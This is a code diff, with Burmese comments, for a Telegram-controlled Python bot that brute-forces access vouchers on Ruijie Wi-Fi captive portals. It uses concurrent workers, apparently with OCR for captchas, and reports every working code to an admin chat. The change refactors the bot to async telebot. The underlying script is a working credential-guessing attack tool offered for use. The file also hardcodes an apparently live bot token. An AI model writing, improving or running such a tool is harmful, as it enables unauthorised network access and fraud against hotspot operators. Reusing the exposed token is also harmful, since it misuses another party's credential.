@@ -9,12 +9,12 @@ import urllib.parse
 import cv2
 import ddddocr
 import numpy as np
-import telebot
+from telebot.async_telebot import AsyncTeleBot  # Async TeleBot သို့ ပြောင်းလဲထားသည်
 
-BOT_TOKEN = "8801899210:AAG7tA3K0z847-DwOQC0M_goARef0rKmLok"  # သင့် Bot Token ပြန်ထည့်ပါ
-ADMIN_ID = 1901101365       # သင့် Chat ID ပြန်ထည့်ပါ
+BOT_TOKEN = "8801899210:AAG7tA3K0z847-DwOQC0M_goARef0rKmLok"  # သင့် Bot Token
+ADMIN_ID = 1901101365       # သင့် Chat ID
 
-bot = telebot.TeleBot(BOT_TOKEN)
+bot = AsyncTeleBot(BOT_TOKEN)
 
 CONCURRENCY_LIMIT = 40  
 BATCH_SIZE = 1000        
@@ -75,7 +75,8 @@ async def update_telegram_status(chat_id):
             f"`[{bar}]`"
         )
         try:
-            bot.edit_message_text(status_text, chat_id, status_msg_id, parse_mode="Markdown")
+            # await သို့ ပြောင်းလဲထားသည်
+            await bot.edit_message_text(status_text, chat_id, status_msg_id, parse_mode="Markdown")
         except:
             pass
 
@@ -120,7 +121,8 @@ async def scan_worker(session, portal_url, gw_sn, gw_id, semaphore, code_to_test
                     if not is_invalid and ("success" in res_text.lower() or '"code":0' in res_text or '"auth_status":1' in res_text):
                         if v_code not in found_vouchers:
                             found_vouchers.add(v_code)
-                            bot.send_message(chat_id, f"✅ *Ruijie Voucher တွေ့ရှိပါပြီ။*\n\n📌 *Code:* `{v_code}`", parse_mode="Markdown")
+                            # await သို့ ပြောင်းလဲထားသည်
+                            await bot.send_message(chat_id, f"✅ *Ruijie Voucher တွေ့ရှိပါပြီ။*\n\n📌 *Code:* `{v_code}`", parse_mode="Markdown")
         except:
             pass
         checked_count += 1
@@ -133,15 +135,15 @@ async def start_scan(portal_url, chat_id):
     gw_id_list = params.get('gw_id', []) or params.get('gwId', [])
 
     if not gw_sn_list:
-        bot.send_message(chat_id, "❌ လင့်ခ်ထဲမှာ gw_sn ရှာမတွေ့ပါ။")
+        await bot.send_message(chat_id, "❌ လင့်ခ်ထဲမှာ gw_sn ရှာမတွေ့ပါ။")
         is_scanning = False
         return
 
     gw_sn = gw_sn_list[0]
     gw_id = gw_id_list[0] if gw_id_list else ""
     
-    # ပထမဦးဆုံး Status ပြမည့် စာတန်းကို အရင်ပို့ထားပြီး Message ID မှတ်ထားမည်
-    initial_msg = bot.send_message(chat_id, "⚡ စကန်ဖတ်ရန် ပြင်ဆင်နေပါပြီ...")
+    # await သို့ ပြောင်းလဲထားသည်
+    initial_msg = await bot.send_message(chat_id, "⚡ စကန်ဖတ်ရန် ပြင်ဆင်နေပါပြီ...")
     status_msg_id = initial_msg.message_id
 
     # Background Status Updater ကို နှိုးခြင်း
@@ -168,31 +170,33 @@ async def start_scan(portal_url, chat_id):
         await asyncio.sleep(2)
 
 @bot.message_handler(commands=['start'])
-def send_welcome(message):
+async def send_welcome(message):
     if message.chat.id == ADMIN_ID:
-        bot.reply_to(message, "👋 Ruijie VIP Live-Status Bot မှ ကြိုဆိုပါတယ်။\n\nစကန်ဖတ်ရန် Portal Link ပို့ပေးပါ။")
+        await bot.reply_to(message, "👋 Ruijie VIP Live-Status Bot မှ ကြိုဆိုပါတယ်။\n\nစကန်ဖတ်ရန် Portal Link ပို့ပေးပါ။")
 
 @bot.message_handler(commands=['stop'])
-def stop_scan_cmd(message):
+async def stop_scan_cmd(message):
     global is_scanning
     if message.chat.id == ADMIN_ID:
         is_scanning = False
-        bot.reply_to(message, "🛑 စကန်ဖတ်ခြင်းကို ရပ်တန့်လိုက်ပါပြီ။")
+        await bot.reply_to(message, "🛑 စကန်ဖတ်ခြင်းကို ရပ်တန့်လိုက်ပါပြီ။")
 
 @bot.message_handler(func=lambda message: True)
-def handle_link(message):
+async def handle_link(message):
     global is_scanning
     if message.chat.id != ADMIN_ID: return
     
     if "http" in message.text:
         if is_scanning:
-            bot.reply_to(message, "⚠️ စကန်ဖတ်နေဆဲ ဖြစ်ပါတယ်။ အရင်ရပ်ရန် /stop ပို့ပါ။")
+            await bot.reply_to(message, "⚠️ စကန်ဖတ်နေဆဲ ဖြစ်ပါတယ်။ အရင်ရပ်ရန် /stop ပို့ပါ။")
             return
         is_scanning = True
-        asyncio.run(start_scan(message.text.strip(), message.chat.id))
+        # asyncio.run() သုံးမည့်အစား background task အဖြစ် တိုက်ရိုက် run စေခြင်း
+        asyncio.create_task(start_scan(message.text.strip(), message.chat.id))
     else:
-        bot.reply_to(message, "❌ လင့်ခ်မှားယွင်းနေပါသည်။")
+        await bot.reply_to(message, "❌ လင့်ခ်မှားယွင်းနေပါသည်။")
 
 if __name__ == '__main__':
-    print("Telegram Bot စတင်ပတ်မောင်းနေပါပြီ...")
-    bot.infinity_polling()
+    print("Telegram Async Bot စတင်ပတ်မောင်းနေပါပြီ...")
+    # Polling ကို အော်တိုပတ်စေရန် asyncio ဖြင့် မောင်းနှင်ခြင်း
+    asyncio.run(bot.infinity_polling())
